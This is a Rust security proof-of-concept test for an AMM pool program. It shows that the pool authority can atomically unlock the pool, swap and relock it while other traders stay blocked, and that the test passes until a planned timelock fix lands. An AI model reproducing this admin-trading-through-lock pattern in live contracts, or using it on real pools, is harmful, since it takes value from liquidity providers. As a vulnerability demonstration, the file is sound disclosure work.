//! Security PoC: lock/unlock timing attack.
//!
//! Demonstrates that the authority can atomically `set_locked(false)` +
//! their own `swap` + `set_locked(true)` in a single transaction,
//! performing a trade that no other user can perform while the pool is
//! in its "locked" state.
//!
//! Why this is a vulnerability: users may interpret `Config.locked == true`
//! as "the pool is paused; my position is safe from execution risk until
//! the authority unlocks." That assumption is wrong. The authority has
//! asymmetric trading access during the lock: a single transaction can
//! open a window, capture value, and close it, all atomically, with no
//! opportunity for any other user to react.
//!
//! This test currently **passes**, which is the bug being demonstrated.
//! After the timelock mitigation, the test will be updated to assert that
//! the atomic unlock+swap+relock transaction *fails*: the unlock
//! instruction will schedule a future unlock (not flip the field
//! immediately), so the trailing swap will still see `locked == true`.
//!
//! See `docs/security/issues/001-lock-unlock-timing-attack.md` for the
//! full writeup and `docs/security/responses/001-lock-unlock-timing-attack.md`
//! for the chosen mitigation.
//!
//! Cast: three actors with distinct narrative roles. `admin` is the
//! pool authority *and* one of the traders (this is the bug); `alice`
//! is the LP whose position the lock is supposed to protect; `bob` is
//! the honest trader who's blocked while the admin trades through the
//! lock. Because `fresh_pool` now hands back the admin as a
//! `UserAccounts` with ATAs already in place, the admin's promotion to
//! a trader is one call to `mint_to_x`; the original test paid for the
//! same thing with ~10 lines of manual ATA setup.

#![cfg(feature = "test-helpers")]

mod common;

use amm::{SwapBundle, SwapKind};
use anchor_litesvm::{TestHelpers, TransactionHelpers};
use common::{setup, SwapDir};

#[test]
fn admin_atomically_unlocks_swaps_and_relocks_while_users_blocked() {
    let mut world = setup();
    let (admin, pool) = world.fresh_pool(30);

    // Alice provides liquidity. The reserves she puts in are the pool's
    // working state; she's the user whose position is supposed to be
    // protected by the "locked" signal.
    let alice = world.user("Alice", 1_000_000, 1_000_000);
    world.deposit(&alice, &pool, 1_000_000, 1_000_000, 1);

    // Promote `admin` from authority-only to trader: give them X to
    // swap. ATAs were created by `fresh_pool` (every actor minted via
    // `cast`/`user`/`fresh_pool` has them by default), so this is just
    // a balance top-up.
    world.mint_to_x(&admin, 200_000);

    // Bob is an honest trader, here to play the role of "user the lock is
    // supposed to protect."
    let bob = world.user("Bob", 100_000, 0);

    // ----- Step 1: authority locks the pool -----
    world.set_locked(&admin, &pool, true);

    // ----- Step 2: bob tries to swap, rejected with PoolLocked -----
    world.swap_expecting(
        &bob,
        &pool,
        SwapKind::ExactInput {
            amount_in: 10_000,
            min_amount_out: 1,
        },
        SwapDir::AtoB,
        "PoolLocked",
    );

    // Capture state before the attack tx.
    let admin_x_before = world.ctx.svm.token_balance(&admin.ata_x).unwrap();
    let admin_y_before = world.ctx.svm.token_balance(&admin.ata_y).unwrap();
    let vault_x_before = world.ctx.svm.token_balance(&pool.vault_x).unwrap();
    let vault_y_before = world.ctx.svm.token_balance(&pool.vault_y).unwrap();

    // ----- Step 3: authority's atomic unlock + swap + relock -----
    //
    // This three-instruction bundle is the attack: the verbs on
    // `Scenario` send one instruction per tx, but the bug being
    // demonstrated relies on packing all three into a single atomic
    // transaction. So this step drops to the lower-level
    // `program().build_ix(...)` + `send_instructions` API on purpose;
    // the verbs cover the happy path, not "do three things atomically".
    let unlock_ix = world.ctx.program().build_ix(
        amm::SetLockedBundle {
            authority: admin.pubkey(),
            config: pool.config,
        },
        amm::instruction::SetLocked { locked: false },
    );
    let admin_swap_ix = world.ctx.program().build_ix(
        SwapBundle {
            user: admin.pubkey(),
            mint_x: pool.mint_x,
            mint_y: pool.mint_y,
            config: pool.config,
            vault_x: pool.vault_x,
            vault_y: pool.vault_y,
            user_x: admin.ata_x,
            user_y: admin.ata_y,
        },
        amm::instruction::Swap {
            kind: SwapKind::ExactInput {
                amount_in: 100_000,
                min_amount_out: 1,
            },
            a_to_b: true,
        },
    );
    let relock_ix = world.ctx.program().build_ix(
        amm::SetLockedBundle {
            authority: admin.pubkey(),
            config: pool.config,
        },
        amm::instruction::SetLocked { locked: true },
    );

    // The atomic-bundle attack needs `send_instructions` (multi-ix tx),
    // which lives on the bare LiteSVM trait and doesn't auto-stash the
    // context's alias table. Attach it explicitly so the structured tree
    // still renders with friendly names.
    let aliases = world.ctx.aliases.clone();
    world
        .ctx
        .svm
        .send_instructions(&[unlock_ix, admin_swap_ix, relock_ix], &[&admin.signer])
        .unwrap()
        .with_aliases(aliases)
        .print_logs_structured()
        .assert_success();

    // ----- Step 4: the attack worked -----
    // Admin spent X, received Y at the locked-pool ratio.
    let admin_x_after = world.ctx.svm.token_balance(&admin.ata_x).unwrap();
    let admin_y_after = world.ctx.svm.token_balance(&admin.ata_y).unwrap();
    assert_eq!(
        admin_x_after,
        admin_x_before - 100_000,
        "admin paid 100_000 X"
    );
    assert!(
        admin_y_after > admin_y_before,
        "admin received Y; specifically: {} Y from the swap",
        admin_y_after - admin_y_before
    );

    // The pool's vaults moved correspondingly. Alice's LP claim on the
    // pool is now denominated in a worse ratio than it was a moment ago,
    // and she had no opportunity to act during the window.
    let vault_x_after = world.ctx.svm.token_balance(&pool.vault_x).unwrap();
    let vault_y_after = world.ctx.svm.token_balance(&pool.vault_y).unwrap();
    assert_eq!(vault_x_after, vault_x_before + 100_000);
    assert!(vault_y_after < vault_y_before);

    // ----- Step 5: bob still can't swap -----
    // Use a different amount than Bob's first attempt so the tx is not
    // byte-identical and litesvm doesn't reject with `AlreadyProcessed`
    // (same data + same blockhash = same signature, deduped). We want to
    // actually hit the handler and confirm the PoolLocked failure path.
    world.swap_expecting(
        &bob,
        &pool,
        SwapKind::ExactInput {
            amount_in: 5_000,
            min_amount_out: 1,
        },
        SwapDir::AtoB,
        "PoolLocked",
    );
}
